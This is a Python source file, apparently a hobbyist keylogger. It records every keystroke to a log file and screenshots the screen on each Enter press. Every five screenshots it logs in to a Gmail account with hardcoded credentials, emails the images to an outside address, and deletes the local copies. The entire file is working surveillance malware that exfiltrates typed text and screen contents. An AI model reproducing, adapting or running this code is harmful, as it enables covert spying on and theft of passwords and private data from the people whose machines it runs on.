from pynput.keyboard import Listener
import pyautogui
import os, smtplib
from email.message import EmailMessage
import shutil

x = 0


def send_mail():
    msg = EmailMessage()
    msg["From"] = 't3st.t3st.6783@gmail.com'
    msg["To"] = 'sdofficial.777.ofc@gmail.com'
    msg["Subject"] = "Screenshots"

    body = "Screenshots"
    msg.set_content(body)
    if "Screenshots" in os.listdir("C:\\Users\\Lenovo\\PycharmProjects\\keylogger\\"):
        path = "C:\\Users\\Lenovo\\PycharmProjects\\keylogger\\Screenshots\\"
    else:
        os.mkdir("C:\\Users\\Lenovo\\PycharmProjects\\keylogger\\Screenshots")
        path = "C:\\Users\\Lenovo\\PycharmProjects\\keylogger\\Screenshots\\"

    images = os.listdir(path)

    for image in images:
        file = open(path + image, "rb")
        data = file.read()
        file_name = file.name
        msg.add_attachment(data, maintype='image', subtype="png", filename=file_name)
        file.close()

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.login('t3st.t3st.6783@gmail.com', 'random@1234')
    server.send_message(msg)

    server.close()
    shutil.rmtree(path)


os.chdir("C:\\Users\\Lenovo\\PycharmProjects\\keylogger\\")
if "Screenshots" in os.listdir("C:\\Users\\Lenovo\\PycharmProjects\\keylogger\\"):
    send_mail()
else:
    os.mkdir("C:\\Users\\Lenovo\\PycharmProjects\\keylogger\\Screenshots")


while True:
    if "Screenshots" not in os.listdir("C:\\Users\\Lenovo\\PycharmProjects\\keylogger\\"):
        os.mkdir("C:\\Users\\Lenovo\\PycharmProjects\\keylogger\\Screenshots")

    def press(key):
        global x
        key = str(key).replace("'", "")

        if key == 'Key.space':
            key = ' '
        if key == 'Key.shift_r':
            key = ''
        if key == "Key.enter":
            key = '\n'
            img = pyautogui.screenshot()
            img.save(r'C:\Users\Lenovo\PycharmProjects\keylogger\Screenshots\img' + str(x) + '.png')
            x += 1
            if x == 5:
                send_mail()
                x = 0

        with open("log.txt", 'a') as f:
            f.write(key)


    with Listener(on_press=press) as l:
        l.join()

